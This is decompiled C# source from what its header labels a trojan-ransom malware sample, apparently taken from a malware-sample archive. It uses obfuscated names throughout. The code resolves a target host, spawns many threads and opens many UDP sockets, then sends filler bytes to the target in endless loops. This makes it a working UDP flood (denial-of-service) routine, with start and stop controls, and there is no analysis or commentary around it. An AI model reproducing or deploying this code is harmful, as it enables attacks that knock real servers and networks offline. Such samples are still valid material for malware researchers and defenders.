// Decompiled with JetBrains decompiler
// Type: DIflsXkjzEGxXmePwyTvBPL
// Assembly: AutoCheckBlackmarket, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 75EFCFBA-7DC9-4B3B-BE71-9373569A5CFD
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.10-msil\HEUR-Trojan-Ransom.Win32.Generic-8865821e232bb31b1db7b1220c933ee51fd7508af48d79d1e7882dd1bf624f62.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;

public class DIflsXkjzEGxXmePwyTvBPL
{
  private static ThreadStart[] tHghIRdFZEcuUuGzSBYISYU;
  private static Thread[] gwMTVeCwacJPiqfLHHGLvDK;
  private static IPEndPoint aBzQGJBZDhfNCWNDRbKKxxY;
  private static DIflsXkjzEGxXmePwyTvBPL.uSzdsZfyHwcXXWbMFMqRDTW[] htWpVsLXLICURoYiokwNOjl;
  public static string JNnbZTliFayFBNQfBCLVQtJ;
  public static bool ZRpTxhdSmdUhrbaOzbxKYGX;
  public static int bvPJyenomrcVcHUTjmphHVO;
  public static int ygiDfkxJdqeQrONoWnZdEep;
  public static int jCyVrQIEPgvRFOlgKMsMSaP;
  public static short uEFDIflsXkjzEGxXmePwyTv;

  public static void uIFnBaaCKXySxWnOnysLuRB()
  {
    try
    {
      DIflsXkjzEGxXmePwyTvBPL.aBzQGJBZDhfNCWNDRbKKxxY = new IPEndPoint(Dns.GetHostEntry(DIflsXkjzEGxXmePwyTvBPL.JNnbZTliFayFBNQfBCLVQtJ).AddressList[0], DIflsXkjzEGxXmePwyTvBPL.bvPJyenomrcVcHUTjmphHVO);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      DIflsXkjzEGxXmePwyTvBPL.aBzQGJBZDhfNCWNDRbKKxxY = new IPEndPoint(IPAddress.Parse(DIflsXkjzEGxXmePwyTvBPL.JNnbZTliFayFBNQfBCLVQtJ), DIflsXkjzEGxXmePwyTvBPL.bvPJyenomrcVcHUTjmphHVO);
      ProjectData.ClearProjectError();
    }
    DIflsXkjzEGxXmePwyTvBPL.gwMTVeCwacJPiqfLHHGLvDK = new Thread[checked (DIflsXkjzEGxXmePwyTvBPL.jCyVrQIEPgvRFOlgKMsMSaP - 1 + 1)];
    DIflsXkjzEGxXmePwyTvBPL.tHghIRdFZEcuUuGzSBYISYU = new ThreadStart[checked (DIflsXkjzEGxXmePwyTvBPL.jCyVrQIEPgvRFOlgKMsMSaP - 1 + 1)];
    DIflsXkjzEGxXmePwyTvBPL.htWpVsLXLICURoYiokwNOjl = new DIflsXkjzEGxXmePwyTvBPL.uSzdsZfyHwcXXWbMFMqRDTW[checked (DIflsXkjzEGxXmePwyTvBPL.jCyVrQIEPgvRFOlgKMsMSaP - 1 + 1)];
    int num = checked (DIflsXkjzEGxXmePwyTvBPL.jCyVrQIEPgvRFOlgKMsMSaP - 1);
    int index = 0;
    while (index <= num)
    {
      DIflsXkjzEGxXmePwyTvBPL.htWpVsLXLICURoYiokwNOjl[index] = new DIflsXkjzEGxXmePwyTvBPL.uSzdsZfyHwcXXWbMFMqRDTW(DIflsXkjzEGxXmePwyTvBPL.aBzQGJBZDhfNCWNDRbKKxxY, DIflsXkjzEGxXmePwyTvBPL.ygiDfkxJdqeQrONoWnZdEep);
      DIflsXkjzEGxXmePwyTvBPL.tHghIRdFZEcuUuGzSBYISYU[index] = new ThreadStart(DIflsXkjzEGxXmePwyTvBPL.htWpVsLXLICURoYiokwNOjl[index].Send);
      DIflsXkjzEGxXmePwyTvBPL.gwMTVeCwacJPiqfLHHGLvDK[index] = new Thread(DIflsXkjzEGxXmePwyTvBPL.tHghIRdFZEcuUuGzSBYISYU[index]);
      DIflsXkjzEGxXmePwyTvBPL.gwMTVeCwacJPiqfLHHGLvDK[index].Start();
      checked { ++index; }
    }
    DIflsXkjzEGxXmePwyTvBPL.ZRpTxhdSmdUhrbaOzbxKYGX = true;
  }

  public static void MSOZqFNOYvqUVCJbjZFzByE()
  {
    int num = checked (DIflsXkjzEGxXmePwyTvBPL.jCyVrQIEPgvRFOlgKMsMSaP - 1);
    int index = 0;
    while (index <= num)
    {
      try
      {
        DIflsXkjzEGxXmePwyTvBPL.gwMTVeCwacJPiqfLHHGLvDK[index].Abort();
        DIflsXkjzEGxXmePwyTvBPL.gwMTVeCwacJPiqfLHHGLvDK[index] = (Thread) null;
        DIflsXkjzEGxXmePwyTvBPL.tHghIRdFZEcuUuGzSBYISYU[index] = (ThreadStart) null;
        DIflsXkjzEGxXmePwyTvBPL.htWpVsLXLICURoYiokwNOjl[index] = (DIflsXkjzEGxXmePwyTvBPL.uSzdsZfyHwcXXWbMFMqRDTW) null;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      checked { ++index; }
    }
    DIflsXkjzEGxXmePwyTvBPL.ZRpTxhdSmdUhrbaOzbxKYGX = false;
  }

  private class uSzdsZfyHwcXXWbMFMqRDTW
  {
    private Socket[] pvDTutKzDtTvbZHvQGwLVEE;
    private IPEndPoint qqSanPjOmEQFCvOLhRciepH;
    private int IdfoMsWmTZsBpVRRPUGyGkL;
    private byte[] wMQTLjNrbXMgWNblUUHtVqE;

    public uSzdsZfyHwcXXWbMFMqRDTW(IPEndPoint SzRDHgVSMebyUsyuHKYtvFP, int JmDVpJDsYhhgkWPWBNNdgjb)
    {
      this.qqSanPjOmEQFCvOLhRciepH = SzRDHgVSMebyUsyuHKYtvFP;
      this.IdfoMsWmTZsBpVRRPUGyGkL = JmDVpJDsYhhgkWPWBNNdgjb;
    }

    private static void zPIrZcwZdrCXkXKlIGiQhTX(IAsyncResult ar)
    {
    }

    public void Send()
    {
      try
      {
        this.pvDTutKzDtTvbZHvQGwLVEE = new Socket[checked (this.IdfoMsWmTZsBpVRRPUGyGkL - 1 + 1)];
        int num1 = checked (this.IdfoMsWmTZsBpVRRPUGyGkL - 1);
        int index1 = 0;
        while (index1 <= num1)
        {
          this.pvDTutKzDtTvbZHvQGwLVEE[index1] = new Socket(this.qqSanPjOmEQFCvOLhRciepH.AddressFamily, SocketType.Dgram, ProtocolType.Udp);
          this.pvDTutKzDtTvbZHvQGwLVEE[index1].Blocking = false;
          this.pvDTutKzDtTvbZHvQGwLVEE[index1].BeginConnect((EndPoint) this.qqSanPjOmEQFCvOLhRciepH, new AsyncCallback(DIflsXkjzEGxXmePwyTvBPL.uSzdsZfyHwcXXWbMFMqRDTW.zPIrZcwZdrCXkXKlIGiQhTX), (object) this.pvDTutKzDtTvbZHvQGwLVEE[index1]);
          checked { ++index1; }
        }
        Thread.Sleep(10);
        int num2 = checked (this.IdfoMsWmTZsBpVRRPUGyGkL - 1);
        int index2 = 0;
        while (index2 <= num2)
        {
          if (this.pvDTutKzDtTvbZHvQGwLVEE[index2].Connected)
          {
            byte[] numArray = new byte[256];
            switch (DIflsXkjzEGxXmePwyTvBPL.uEFDIflsXkjzEGxXmePwyTv)
            {
              case 2:
                this.wMQTLjNrbXMgWNblUUHtVqE = Encoding.UTF8.GetBytes("~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~");
                break;
              case 3:
                this.wMQTLjNrbXMgWNblUUHtVqE = Encoding.UTF8.GetBytes("~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~");
                break;
              default:
                this.wMQTLjNrbXMgWNblUUHtVqE = Encoding.UTF8.GetBytes("~");
                break;
            }
            while (true)
            {
              Thread.Sleep(0);
              this.pvDTutKzDtTvbZHvQGwLVEE[index2].Send(this.wMQTLjNrbXMgWNblUUHtVqE, SocketFlags.Partial);
            }
          }
          else
            checked { ++index2; }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }
  }
}
